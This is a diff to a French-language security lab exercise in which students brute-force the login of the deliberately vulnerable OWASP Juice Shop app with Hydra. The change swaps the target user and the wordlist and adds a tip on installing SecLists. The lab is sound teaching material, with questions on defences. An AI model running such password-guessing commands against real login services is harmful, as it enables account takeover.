@@ -393,8 +393,14 @@ Comprendre comment un attaquant teste automatiquement des mots de passe.
 2. Construisez la commande Hydra, par exemple (en assumant la structure précédente, elle peut varier dans votre cas précis) : 
 
     ```bash
-    hydra -l admin@juice-sh.op -s <PORT> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}1=401:H=Content-Type\:application/json:F=Unable"
+    hydra -l jim@juice-sh.op -s <PORT> -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt <IP> http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}1=401:H=Content-Type\:application/json:F=Unable"
     ```
+
+    {: .astuce}
+    > Pour réaliser la commande suivante, vous aurez possiblement à installer les "seclists" comme suit :
+    >```bash
+    >sudo apt install seclists
+    >```
 
 
 3. Lancez la commande et observez :
@@ -407,6 +413,4 @@ Comprendre comment un attaquant teste automatiquement des mots de passe.
 
 - Pourquoi Hydra a besoin du message d’erreur ?  
 - Quelles mesures pourraient empêcher cette attaque ?  
-
-
 
